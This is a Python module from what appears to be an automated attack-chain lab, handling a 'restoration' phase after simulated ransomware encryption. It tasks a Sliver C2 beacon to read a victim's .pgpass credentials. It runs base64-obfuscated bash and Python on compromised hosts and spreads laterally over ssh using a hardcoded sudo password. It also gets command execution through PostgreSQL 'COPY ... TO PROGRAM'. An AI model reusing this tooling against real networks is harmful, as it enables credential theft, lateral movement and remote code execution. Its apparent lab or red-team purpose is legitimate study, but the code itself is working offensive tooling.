import os
import re
import time
import base64
import subprocess

from chainlog import log
from advanced_initial_access import sliver_exec

# =============================================================================
# advanced_restoration.py — Advanced DB & File Restoration
# =============================================================================

PGPASS_PATH = "/home/vinzenz.fedora/.pgpass"
DB_HOST = "10.30.0.6"


# ---------------------------------------------------------------------------
# Helpers: beacon task polling (copied from advanced_exfiltration.py)
# ---------------------------------------------------------------------------

def _beacon_task_wait(beacon_id: str, task_id: str, *,
                      max_polls: int = 24, interval: int = 5) -> str | None:
    for i in range(max_polls):
        time.sleep(interval)
        fetch_out = sliver_exec(beacon_id, f"tasks fetch {task_id}", timeout=30)
        if "✅ Completed" in fetch_out:
            if "[*] Output:" in fetch_out:
                return fetch_out.split("[*] Output:", 1)[1].strip()
            return fetch_out
    return None

def _beacon_exec_wait(beacon_id: str, command: str, *,
                      cmd_timeout: int = 120,
                      max_polls: int = 24, interval: int = 5) -> str | None:
    output = sliver_exec(beacon_id, command, timeout=cmd_timeout)
    m = re.search(r"\[\*\] Tasked beacon \w+ \((.*?)\)", output)
    if not m:
        log(f"[-] No task ID found. Output: {output.strip()}")
        return None
    task_id = m.group(1)
    log(f"[*] Beacon task {task_id} submitted. Polling for completion …")
    return _beacon_task_wait(beacon_id, task_id,
                             max_polls=max_polls, interval=interval)


# ---------------------------------------------------------------------------
# Attack phases
# ---------------------------------------------------------------------------

def _discover_db_creds(vinzenz_beacon: str) -> dict | None:
    """Read ~/.pgpass from vinzenz_ws via the beacon."""
    log(f"[*] Reading DB credentials from {PGPASS_PATH} …")
    result = _beacon_exec_wait(
        vinzenz_beacon,
        f"execute -o -- cat {PGPASS_PATH}",
        max_polls=15, interval=5,
    )
    if result is None:
        log("[-] Task did not complete or returned no output.")
        return None

    for line in result.splitlines():
        line = line.strip()
        if (not line or line.startswith("#") or
            any(kw in line for kw in (
                "Task", "State", "Description", "Created", "Sent",
                "Completed", "Request Size", "Response Size",
                "+-", "| ", "[*]"))):
            continue
        parts = line.split(":", 4)
        if len(parts) == 5:
            host, port, dbname, user, password = parts
            log(f"[+] Found credential: {user}@{host}:{port}/{dbname}")
            return {"host": host, "port": port, "dbname": dbname,
                    "user": user, "password": password}

    log(f"[-] No usable credential found in .pgpass")
    return None


def _perform_network_restoration(vinzenz_beacon: str, creds: dict) -> bool:
    """Run restoration across all hosts on the network.
    
    Decrypts files on vinzenz, john, luke, and apache, as well as the database.
    """
    privkey_path = "/Attack-chain/exfil_keys/private.pem"
    if os.path.exists(privkey_path):
        with open(privkey_path, "r") as f:
            private_key_pem = f.read().strip()
    else:
        log("[-] Error: Persistent private key not found on Kali. Cannot restore.")
        return False
    
    restore_ok = True
    try:
        # Build the shell script to run on vinzenz_ws
        restore_script = f"""#!/bin/bash
export HOME="/home/vinzenz.fedora"
export USER="vinzenz.fedora"

# Database host info
DB_IP="{creds['host']}"

# Write private key to temporary file for openssl
cat << 'EOF' > /tmp/privkey.pem
{private_key_pem}
EOF

# Unified function: finds .enc files and decrypts them in-place
process_and_restore_local() {{
    local src_dir="$1"
    [ -d "$src_dir" ] || return 0
    
    echo "VinzenzAdmin!2026" | sudo -S find "$src_dir" -type f -name "*.enc" ! -path "*/.cache/*" ! -path "*/.ssh/*" 2>/dev/null | while read -r filepath; do
        local orig="${{filepath%.enc}}"
        echo "VinzenzAdmin!2026" | sudo -S openssl cms -decrypt -binary -in "$filepath" -out "$orig" -inkey /tmp/privkey.pem 2>/dev/null && echo "VinzenzAdmin!2026" | sudo -S rm "$filepath"
    done
}}

# Restore local files on Vinzenz Workstation
echo "[*] Restoring files on Vinzenz Workstation ..."
for udir in /home/* /root; do
    [ -d "$udir" ] && process_and_restore_local "$udir"
done

if [ -d /etc/ssh ]; then
    process_and_restore_local "/etc/ssh"
fi
if [ -d /run/secrets ]; then
    process_and_restore_local "/run/secrets"
fi

for db_dir in /var/lib/mysql /var/lib/postgresql /var/lib/redis; do
    if [ -d "$db_dir" ]; then
        process_and_restore_local "$db_dir"
    fi
done

for mdir in /var/spool/mail /var/mail; do
    if [ -d "$mdir" ]; then
        process_and_restore_local "$mdir"
    fi
done

# Helper for remote restoration script (sent to other hosts)
build_remote_restore_script() {{
    cat << 'EOF'
#!/bin/bash

# Write private key to temporary file for openssl
cat << 'EOF2' > /tmp/privkey.pem
{private_key_pem}
EOF2

process_and_restore() {{
    local src_dir="$1"
    [ -d "$src_dir" ] || return 0
    echo "VinzenzAdmin!2026" | sudo -S find "$src_dir" -type f -name "*.enc" ! -path "*/.cache/*" ! -path "*/.ssh/*" 2>/dev/null | while read -r filepath; do
        local orig="${{filepath%.enc}}"
        echo "VinzenzAdmin!2026" | sudo -S openssl cms -decrypt -binary -in "$filepath" -out "$orig" -inkey /tmp/privkey.pem 2>/dev/null && echo "VinzenzAdmin!2026" | sudo -S rm "$filepath"
    done
}}

# Restore User Homes & Root
for udir in /home/* /root; do
    [ -d "$udir" ] && process_and_restore "$udir"
done

# Restore SSH Configurations & Server Keys
if [ -d /etc/ssh ]; then
    process_and_restore "/etc/ssh"
fi

# Restore Web files
if [ -d /var/www/html ]; then
    process_and_restore "/var/www/html"
fi

# Restore Container secrets
if [ -d /run/secrets ]; then
    process_and_restore "/run/secrets"
fi

# Restore Physical database stores
for db_dir in /var/lib/mysql /var/lib/postgresql /var/lib/redis; do
    if [ -d "$db_dir" ]; then
        process_and_restore "$db_dir"
    fi
done

# Restore Local Mails
for mdir in /var/spool/mail /var/mail; do
    if [ -d "$mdir" ]; then
        process_and_restore "$mdir"
    fi
done

rm -f /tmp/privkey.pem
EOF
}}

# Build script once
build_remote_restore_script > /tmp/restorer.sh
B64_RESTORE=$(base64 -w0 /tmp/restorer.sh)

# Execute on John's Workstation
echo "[*] Restoring files on John's workstation ..."
ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null john "echo \"$B64_RESTORE\" | base64 -d > /tmp/restorer.sh && echo 'VinzenzAdmin!2026' | sudo -S bash /tmp/restorer.sh && rm -f /tmp/restorer.sh" || echo "[-] John workstation restore failed"

# Execute on Luke's Workstation
echo "[*] Restoring files on Luke's workstation ..."
ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null luke "echo \"$B64_RESTORE\" | base64 -d > /tmp/restorer.sh && echo 'VinzenzAdmin!2026' | sudo -S bash /tmp/restorer.sh && rm -f /tmp/restorer.sh" || echo "[-] Luke workstation restore failed"

# Execute on Apache Webserver
echo "[*] Restoring files on Apache Webserver ..."
ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null apache "echo \"$B64_RESTORE\" | base64 -d > /tmp/restorer.sh && echo 'VinzenzAdmin!2026' | sudo -S bash /tmp/restorer.sh && rm -f /tmp/restorer.sh" || echo "[-] Apache restore failed"

rm -f /tmp/restorer.sh /tmp/privkey.pem
echo "[+] Workstation file restoration completed"
"""
        b64_script = base64.b64encode(restore_script.encode()).decode()
        
        # Execute the script on vinzenz_ws
        log("[*] Tasking beacon to run restoration script on all network hosts …")
        task_output = _beacon_exec_wait(
            vinzenz_beacon,
            f"execute -o -- sh -c 'echo {b64_script} | base64 -d | bash'",
            cmd_timeout=180,
            max_polls=36,
            interval=5
        )
        
        if task_output:
            log(f"[+] Beacon task completed. Output:\n{task_output}")
        else:
            log("[-] Beacon task did not return output or timed out.")
            
        # Restore Database via PoC query logic
        _db_restoration(vinzenz_beacon, creds, private_key_pem)
            
    except Exception as e:
        log(f"[-] Exception during restoration: {e}")
        restore_ok = False
        
    return restore_ok


def _db_restoration(vinzenz_beacon: str, creds: dict, private_key_pem: str) -> bool:
    log("[*] Restoring PostgreSQL database from encrypted archive ...")
    try:
        privkey_base64 = base64.b64encode(private_key_pem.encode()).decode().strip()
        
        # 1. Create database waystar (must connect to 'postgres' database)
        sql_create = "CREATE DATABASE waystar;"
        
        # 2. Decrypt and import SQL dump
        sql_import = "COPY (SELECT 1) TO PROGRAM 'echo ''" + privkey_base64 + "'' | base64 -d > /tmp/privkey.pem && openssl cms -decrypt -binary -in /var/lib/postgresql/TEST.sql.enc -inkey /tmp/privkey.pem -out /tmp/restore.sql && psql -U waystar -d waystar -f /tmp/restore.sql && rm -f /tmp/privkey.pem /tmp/restore.sql /var/lib/postgresql/TEST.sql.enc';"
        
        db_code = f"""import subprocess, sys
try:
    env = {{
        "PGPASSWORD": "{creds['password']}",
        "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    }}
    
    # Recreate the waystar DB via postgres connection
    proc_create = subprocess.run(
        [
            "psql",
            "-h", "{creds['host']}",
            "-p", "{creds['port']}",
            "-U", "{creds['user']}",
            "-d", "postgres",
            "-c", \"\"\"{sql_create}\"\"\"
        ],
        env=env,
        capture_output=True,
        text=True
    )
    if proc_create.returncode != 0:
        # If it already exists or fails, log it but try to continue
        print(f"[*] Note during DB creation: {{proc_create.stderr.strip()}}")
        
    # Decrypt and import into waystar DB
    proc_import = subprocess.run(
        [
            "psql",
            "-h", "{creds['host']}",
            "-p", "{creds['port']}",
            "-U", "{creds['user']}",
            "-d", "postgres",
            "-c", \"\"\"{sql_import}\"\"\"
        ],
        env=env,
        capture_output=True,
        text=True
    )
    
    if proc_import.returncode == 0:
        print("[+] DB-Wiederherstellung erfolgreich")
        sys.exit(0)
    else:
        print(f"[-] DB-Wiederherstellung fehlgeschlagen: {{proc_import.stderr.strip()}}")
        sys.exit(1)
except Exception as e:
    print(f"[-] DB-Wiederherstellung fehlgeschlagen: {{e}}")
    sys.exit(1)
"""
        b64_db = base64.b64encode(db_code.encode()).decode()
        
        # Run the query through the beacon on Vinzenz Workstation
        task_output = _beacon_exec_wait(
            vinzenz_beacon,
            f"execute -o -- python3 -c \"import base64; exec(base64.b64decode('{b64_db}').decode())\"",
            cmd_timeout=30,
            max_polls=6,
            interval=5
        )
        
        if task_output:
            log(f"[+] DB Restoration Output:\n{task_output.strip()}")
            if "[+] DB-Wiederherstellung erfolgreich" in task_output:
                return True
        else:
            log("[-] DB Restoration did not return output or timed out.")
        return False
    except Exception as e:
        log(f"[-] Exception during DB restoration: {e}")
        return False


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

def run(root_sliver_session: str, vinzenz_beacon: str, results_dir: str) -> dict:
    """Execute Phase 9: Restoration."""
    log("\n[*] Starting Data Restoration (Phase 9) …")

    if not vinzenz_beacon:
        log("[-] No active vinzenz beacon provided. Cannot proceed.")
        return {"restore_success": False}

    creds = _discover_db_creds(vinzenz_beacon)
    if not creds:
        return {"restore_success": False}

    creds["host"] = DB_HOST

    restore_ok = _perform_network_restoration(vinzenz_beacon, creds)

    if restore_ok:
        log("[+] Phase 9: Data Restoration completed successfully.")
    else:
        log("[-] Phase 9: Data Restoration failed.")

    return {"restore_success": restore_ok}

if __name__ == "__main__":
    pass
